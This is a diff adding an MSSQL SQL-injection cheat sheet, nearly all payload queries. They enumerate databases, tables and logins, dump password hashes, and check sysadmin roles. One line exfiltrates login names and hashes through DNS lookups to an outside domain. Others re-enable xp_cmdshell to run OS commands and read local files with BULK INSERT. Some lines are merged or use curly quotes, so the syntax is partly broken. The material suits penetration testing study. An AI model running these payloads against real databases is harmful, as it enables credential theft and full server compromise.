@@ -1,0 +1,105 @@
+SELECT @@version
+
+-- comment
+/*comment*/
+
+#list current database name
+select DB_NAME()
+
+#list databases
+SELECT name FROM master..sysdatabases;
+SELECT DB_NAME(N); — for N = 0, 1, 2, …
+
+#list columns
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
+
+#list tables
+SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views
+SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;
+SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=’sometable’; — list colum names and types for master..sometable
+
+#current user
+select user_name()
+select system_user
+select user
+select loginame from master..sysprocesses where spid = @@SPID
+
+select name from master..syslogins
+
+#List password hashes
+select name, password from master..sysxlogins -- mssql 2000
+select name, master.dbo.fn_varbintohexstr(password) from master..sysxlogins
+select name, password_hash from master.sys.sql_logins --mssql 2005
+
+#List privileges
+– current privs on a particular object in 2005, 2008
+SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’); — current database
+SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’); — current server
+SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’); –permissions on a table
+SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);
+–permissions on a user– current privs in 2005, 2008
+SELECT is_srvrolemember(‘sysadmin’);
+SELECT is_srvrolemember(‘dbcreator’);
+SELECT is_srvrolemember(‘bulkadmin’);
+SELECT is_srvrolemember(‘diskadmin’);
+SELECT is_srvrolemember(‘processadmin’);
+SELECT is_srvrolemember(‘serveradmin’);
+SELECT is_srvrolemember(‘setupadmin’);
+SELECT is_srvrolemember(‘securityadmin’);
+– who has a particular priv? 2005, 2008
+SELECT name FROM master..syslogins WHERE denylogin = 0;
+SELECT name FROM master..syslogins WHERE hasaccess = 1;
+SELECT name FROM master..syslogins WHERE isntname = 0;
+SELECT name FROM master..syslogins WHERE isntgroup = 0;
+SELECT name FROM master..syslogins WHERE sysadmin = 1;
+SELECT name FROM master..syslogins WHERE securityadmin = 1;
+SELECT name FROM master..syslogins WHERE serveradmin = 1;
+SELECT name FROM master..syslogins WHERE setupadmin = 1;
+SELECT name FROM master..syslogins WHERE processadmin = 1;
+SELECT name FROM master..syslogins WHERE diskadmin = 1;
+SELECT name FROM master..syslogins WHERE dbcreator = 1;
+SELECT name FROM master..syslogins WHERE bulkadmin = 1;
+
+#list DBA accounts
+SELECT is_srvrolemember(‘sysadmin’); — is your account a sysadmin?  returns 1 for true, 0 for false, NULL for invalid role.  Also try ‘bulkadmin’, ‘systemadmin’ and other values from the documentation
+SELECT is_srvrolemember(‘sysadmin’, ‘sa’); — is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.
+SELECT name FROM master..syslogins WHERE sysadmin = ’1′ — tested on 2005
+
+#find tables from column name
+– NB: This example works only for the current database.  If you wan’t to search another db, you need to specify the db name (e.g. replace sysobject with mydb..sysobjects).
+SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE sysobjects.xtype = ‘U’ AND syscolumns.name LIKE ‘%PASSWORD%’ — this lists table, column for each column containing the word ‘password’
+
+#select N-th row/char
+SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC — gets 9th row
+SELECT substring(‘abcd’, 3, 1) — returns c
+
+#bitwise AND
+SELECT 6 & 2 — returns 2
+SELECT 6 & 1 — returns 0
+
+#ASCII/CHAR conversions
+SELECT char(0×41) — returns A
+SELECT ascii(‘A’) – returns 65
+
+#avoiding quotes
+SELECT char(65)+char(66) — returns AB
+
+#Time delay
+WAITFOR DELAY ’0:0:5′ — pause for 5 seconds
+
+#make dns requests
+declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’); — nonpriv, works on 2000declare @host varchar(800); select @host = name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + ‘c$boot.ini”’); — priv, works on 2005– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.
+
+#command execution
+EXEC xp_cmdshell ‘net user’; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
+EXEC sp_configure ‘show advanced options’, 1; — priv
+RECONFIGURE; — priv
+EXEC sp_configure ‘xp_cmdshell’, 1; — priv
+RECONFIGURE; — priv
+
+#Local File Access
+CREATE TABLE mydata (line varchar(8000));
+BULK INSERT mydata FROM ‘c:boot.ini’;
+DROP TABLE mydata;
+
